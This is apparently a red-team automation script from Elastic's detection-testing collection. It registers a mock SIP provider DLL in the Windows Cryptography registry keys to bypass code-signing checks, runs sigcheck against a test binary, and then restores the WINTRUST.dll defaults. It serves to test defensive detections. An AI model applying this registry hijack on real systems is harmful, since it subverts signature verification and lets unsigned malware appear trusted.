# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: SIP Provider Modification
# RTA: sip_provider.py
# ATT&CK: TBD
# Description: Registers a mock SIP provider to bypass code integrity checks and execute mock malware.

from . import common


CRYPTO_ROOT = "SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0"
VERIFY_DLL_KEY = "%s\\CryptSIPDllVerifyIndirectData\\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" % CRYPTO_ROOT
GETSIG_KEY = "%s\\CryptSIPDllGetSignedDataMsg\\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" % CRYPTO_ROOT


def register_sip_provider(dll_path, verify_function, getsig_function):
    winreg = common.get_winreg()
    hkey = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, VERIFY_DLL_KEY)

    common.log("Setting verify dll path: %s" % dll_path)
    winreg.SetValueEx(hkey, "Dll", 0, winreg.REG_SZ, dll_path)

    common.log("Setting verify function name: %s" % verify_function)
    winreg.SetValueEx(hkey, "FuncName", 0, winreg.REG_SZ, verify_function)

    hkey = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, GETSIG_KEY)

    common.log("Setting getsig dll path: %s" % dll_path)
    winreg.SetValueEx(hkey, "Dll", 0, winreg.REG_SZ, dll_path)

    common.log("Setting getsig function name: %s" % getsig_function)
    winreg.SetValueEx(hkey, "FuncName", 0, winreg.REG_SZ, getsig_function)


if common.is_64bit():
    SIGCHECK = common.get_path("bin", "sigcheck64.exe")
    TRUST_PROVIDER_DLL = common.get_path("bin", "TrustProvider64.dll")
else:
    SIGCHECK = common.get_path("bin", "sigcheck32.exe")
    TRUST_PROVIDER_DLL = common.get_path("bin", "TrustProvider32.dll")

TARGET_APP = common.get_path("bin", "myapp.exe")


@common.requires_os(common.WINDOWS)
@common.dependencies(SIGCHECK, TRUST_PROVIDER_DLL, TARGET_APP)
def main():
    common.log("Registering SIP provider")
    register_sip_provider(TRUST_PROVIDER_DLL, "VerifyFunction", "GetSignature")

    common.log("Launching sigcheck")
    common.execute([SIGCHECK, "-accepteula", TARGET_APP])

    common.log("Cleaning up", log_type="-")
    wintrust = "C:\\Windows\\System32\\WINTRUST.dll"
    register_sip_provider(wintrust, "CryptSIPVerifyIndirectData", "CryptSIPGetSignedDataMsg")


if __name__ == "__main__":
    exit(main())
